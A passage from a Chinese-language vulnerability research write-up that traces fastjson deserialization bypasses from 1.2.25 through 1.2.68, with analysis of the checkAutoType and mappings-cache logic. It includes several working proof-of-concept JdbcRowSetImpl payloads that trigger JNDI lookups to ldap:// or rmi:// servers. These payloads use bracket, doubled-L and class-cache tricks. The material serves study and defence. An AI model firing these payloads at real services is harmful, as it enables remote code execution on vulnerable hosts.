语句块中，使用`lexer.stringVal()`方法获取当前`Token`的字符串值，并与`val`进行比较。如果不相等，则抛出一个`JSON`异常；如果相等，则使用`lexer.nextToken()`方法将`lexer`的指针指向下一个`Token`，然后使用`parser.accept(JSONToken.COLON)`方法接受一个冒号`Token`，以便后续的解析器对其进行处理。最后，使用`parser.parse()`方法解析当前`Token`，并将解析结果赋值给`objVal`。如果当前`Token`不是一个对象的结束符（右花括号），则使用`parser.accept(JSONToken.RBRACE)`方法接受一个右花括号`Token`，以便后续的解析器对其进行处理。如果当前解析器的状态不是`TypeNameRedirect`，则直接使用`parser.parse()`方法解析当前`Token`，并将解析结果赋值给`objVal`。根据之前分析的，`objVal`会传给`strVal`，然后`TypeUtils.loadClass`在执行的过程中，会把`strVal`放到`mappings`缓存中。![](../../.resource/remote/02d46032d85a390d53e6acad581581bee9550cf1d966943950ae8649bbc0ba8a.png)![](../../.resource/remote/c767fc8c440c8801668e62477d37f73539e38f0901b4bc61052e2b25fbc21aa4.png)加载到缓存中以后，在下一次`checkAutoType`的时候，直接就返回了，绕过了检验的部分直接执行：![](../../.resource/remote/119a1753f95d9b1ae804eab4aa3596178cee36c133331ba23bd17ace36da4fb6.png)

#### ②第二种 poc

第二种`poc`的绕过手法在上面的 “黑白名单机制介绍” 中已经写的很清楚了，直接参考即可。需要注意的是，由于代码是循环去掉`L`和`;`的，所以我们不一定只在头尾各加一个`L`和`;`。由于 1.2.25 的代码中有如下代码：![](../../.resource/remote/10a9459493f798cf0b1055878bc51349964452c63b1d84b80fce09e328b841e2.png)因此我们可以构造如下`poc`：

```
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"a\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{, \"dataSourceName\":\"ldap://127.0.0.1:1389/ift2ty\", \"autoCommit\":true\}\}";
        JSONObject.parse(payload);
    }
}


```

也可以绕过：![](../../.resource/remote/1f5bc6dcebb8765ed863604ba1af73e69e2013c42443ad666b05ae31a261c864.png)

### （4）关于 JdbcRowSetImpl 链利用的分析

从上面我们学习了绕过黑白名单的学习，接下来看`JdbcRowSetImpl`利用链的原理。根据`FastJson`反序列化漏洞原理，`FastJson`将`JSON`字符串反序列化到指定的`Java`类时，会调用目标类的`getter`、`setter`等方法。`JdbcRowSetImpl`类的`setAutoCommit()`会调用`connect()`方法，`connect()`函数如下：![](../../.resource/remote/6f99f5479e96354bdb8a5d1a4ce0c421e7a56cd7a438062b93b9df9492bb45c2.png)![](../../.resource/remote/7a9d02ca3cf914b69300b1f64508c5ebd570d19da80b03594399160785c37b0d.png)我们把这段代码单独拿出来分析：

```
private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}


```

一眼就看到了两行异常熟悉的代码：

```
InitialContext var1 = new InitialContext();
DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());


```

我们可以通过一个简单的小`demo`快速了解：

```
package org.example;
import com.sun.rowset.JdbcRowSetImpl;

public class Main {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();
        JdbcRowSetImpl_inc.setDataSourceName("rmi://127.0.0.1:1099/ift2ty");
        JdbcRowSetImpl_inc.setAutoCommit(true);
    }
}


```

![](../../.resource/remote/4b8401d13f7ee666245c5d82cf3a0d6ff39335f56294005ed41664569c07a6e6.png)所以之前的两种`poc`可以直接自定义`uri`利用成功。

3. fastjson 1.2.42 反序列化漏洞
-------------------------

首先先下载`fastjson 1.2.25`：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>fastjson_1_2_42</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.42</version>
        </dependency>
    </dependencies>

</project>


```

![](../../.resource/remote/a3aabc9bcdb98a4959d51d46a506d10151954c80c2c2a4416ddb6ccfe95ee143.png)直接翻到`ParseConfig`这里：![](../../.resource/remote/51e81069af6d178dc1b75ad4b3fbda37935fefe9c4301d346cb6de74faa23152.png)可以看到，`fastjson`把原来的明文黑名单转换为`Hash`黑名单，但是并没什么用，目前已经被爆出来了大部分，具体可以参考：

> https://github.com/LeadroyaL/fastjson-blacklist

然后`checkAutoType`这里进行判断，仅仅是把原来的`L`和`;`换成了`hash`的形式：![](../../.resource/remote/7ca2349652e1797605b5ff1045d8f883bb4fe5ce3a2018cde1007bc84b43d09c.png)所以直接双写`L`和`;`即可：

```
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
        JSONObject.parse(payload);
    }
}


```

![](../../.resource/remote/457a44e2aef17a8cdad195b10c60fa8097492b86146bf85849b8661f0ad477e3.png)image.png

4. fastjson 1.2.43 反序列化漏洞
-------------------------

修改之前的`pom.xml`里面的版本为`1.2.43`。直接全局搜索`checkAutoType`，看修改后的代码：![](../../.resource/remote/c1549d52b589ccf2cd9642cfd13588c08f9c31b41760b87bb70c59e4227c500f.png)意思就是说如果出现连续的两个`L`，就报错。那么问题来了，你也妹对`[`进行限制啊，直接绕：

```
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
        JSONObject.parse(payload);
    }
}


```

![](../../.resource/remote/fa343d8f9778f296360bba7b464a83466d98b3e51ab78bd1d43bb54d348b5dd4.png)image.png

5. fastjson 1.2.44 mappings 缓存导致反序列化漏洞
--------------------------------------

修改之前的`pom.xml`里面的版本为`1.2.44`。这个版本的`fastjson`总算是修复了之前的关于字符串处理绕过黑名单的问题，但是存在之前完美在说`fastjson 1.2.25`版本的第一种`poc`的那个通过`mappings`缓存绕过`checkAutoType`的漏洞，复现如下：

```
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\",\"autoCommit\":true\}\}";
        JSONObject.parse(payload);
    }
}


```

![](../../.resource/remote/c720d63ee73a52afdfd955321671188ac82625cb55636a2daafe86d63ae202c5.png)image.png

6. fastjson 1.2.47 mappings 缓存导致反序列化漏洞
--------------------------------------

原理同上，`payload`也同上。复现截图：![](../../.resource/remote/a9ae9dda8b9c1eeee79b77a4e5785897e4cefef3b7f1797dc2cf0d4bb7afbfcd.png)

7.fastjson 1.2.68 反序列化漏洞
------------------------

`fastjson 1.2.47`的时候爆出来的这个缓存的漏洞很严重，官方在`1.2.48`的时候就进行了限制。我们修改上面的`pom.xml`中`fastjson`版本为`1.2.68`。直接翻到`MiscCodec`这里，可以发现，`cache`这里默认设置成了`false`：![](../../.resource/remote/bbaca483b787b5d81632d7bba3d58f6ca1243894cb61f810a2489f7981d594a2.png)并且`loadClass`重载方法的默认的调用改为不缓存：![](../../.resource/remote/3e64b55232115590d355633a5cdd8ab73e3dbf14b10c6dd20a9995c999dfdfc6.png)`fastjson 1.2.68`的一个亮点就是更新了个`safeMode`：![](../../.resource/remote/58453cbdee521a64291670e817066908a45cc81fedd19f886590b00393d5c477.png)如果开启了`safeMode`，那么`autoType`就会被完全禁止。但是，这个版本有了个新的绕过方式：`expectClass`。仔细看`checkAutoType`函数：![](../../.resource/remote/0ae5788996de82638984337981339ef8f323c7b2e604ed7d38edb182d31b126c.png)

> 以下条件的整理参考：https://blog.csdn.net/mole_exp/article/details/122315526

发现同时满足以下条件的时候，可以绕过`checkAutoType`：

*   `expectClass`不为`null`，且不等于`Object.class`、`Serializable.class`、`Cloneable.class`、`Closeable.class`、`EventListener.class`、`Iterable.class`、`Collection.class`；
    
*   `expectClass`需要在缓存集合`TypeUtils#mappings`中；
    
*   `expectClass`和`typeName`都不在黑名单中；
    
*   `typeName`不是`ClassLoader`、`DataSource`、`RowSet`的子类；
    
*   `typeName`是`expectClass`的子类。
    

这个`expectClass`并不是什么陌生的新名词，我们在前置知识里面的`demo`中的这个`Person.class`就是期望类：

```
Person person2 = JSON.parseObject(jsonString2, Person.class);


```

但是之前的那些`payload`执行的时候，期望类这里都是`null`，那么是哪些地方调用了呢？我们直接全局搜索`parser.getConfig().checkAutoType`：![](../../.resource/remote/f356fb6e3fe67f7d0dff47a94d222322527a8619a93a3fa71e39b7b06d0ca903.png)一个是`JavaBeanDeserializer`的`deserialze`这里：![](../../.resource/remote/4436bafa889dcc12219a75dccdba8dd3954fd15ef6cd28dcf3fb1f9672f8caa6.png)另一个是`ThrowableDeserializer`的`deserialze`这里：![](../../.resource/remote/c1b063c09068492196ad564d7f5fc76c40238c4842af868087392cafd672cbb7.png)具体的分析可以看`tr1ple`师傅的文章，写的实在是太详细了：

> https://www.cnblogs.com/tr1ple/p/13489260.html

四、参考与致谢
=======

我在学习`fastjson`漏洞的时候，阅读参考了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出！也十分感谢`4ra1n`师傅和`su18`师傅热情地回答我一个`Java`初学者提出的可能有点傻的问题。（笑）

```
https://www.anquanke.com/post/id/248892
https://paper.seebug.org/1698/
https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/
https://www.rc.sb/fastjson/
https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl利用链/
https://blog.weik1.top/2021/09/08/Fastjson 反序列化历史漏洞分析/
http://blog.topsec.com.cn/fastjson-1-2-24反序列化漏洞深度分析/
https://xz.aliyun.com/t/7107
https://www.javasec.org/java-vuls/FastJson.html
https://www.freebuf.com/articles/web/265904.html
https://b1ue.cn/archives/506.html
http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/
https://forum.butian.net/share/1092
https://www.freebuf.com/vuls/178012.html
https://www.cnblogs.com/nice0e3/p/14776043.html
https://www.cnblogs.com/nice0e3/p/14601670.html
http://140.143.242.46/blog/024.html
https://paper.seebug.org/994/
https://paper.seebug.org/1192/
http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/
https://zhuanlan.zhihu.com/p/544463507
https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/
https://www.anquanke.com/post/id/240446
https://yaklang.io/products/article/yakit-technical-study/fast-Json/
https://su18.org/post/fastjson/#2-fastjson-1225
https://cloud.tencent.com/developer/article/1957185
https://yaklang.io/products/article/yakit-technical-study/fast-Json
https://developer.aliyun.com/article/842073
http://wjlshare.com/archives/1526
https://xz.aliyun.com/t/9052#toc-16
https://blog.csdn.net/Adminxe/article/details/105918000
https://blog.csdn.net/q20010619/article/details/123155767
https://xz.aliyun.com/t/7027#toc-3
https://xz.aliyun.com/t/7027#toc-5
https://www.sec-in.com/article/950
https://xz.aliyun.com/t/7027#toc-14
https://www.cnblogs.com/nice0e3/p/14776043.html#1225-1241-绕过
https://www.cnblogs.com/nice0e3/p/14776043.html#1225版本修复
https://y4er.com/posts/fastjson-1.2.80/#回顾fastjson历史漏洞
https://github.com/su18/hack-fastjson-1.2.80
https://blog.csdn.net/mole_exp/article/details/122315526
https://www.cnblogs.com/ph4nt0mer/p/13065373.html
https://alewong.github.io/2020/09/14/Fastjson-1-2-68版本反序列化漏洞分析篇/
https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html
https://www.anquanke.com/post/id/225439


```

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
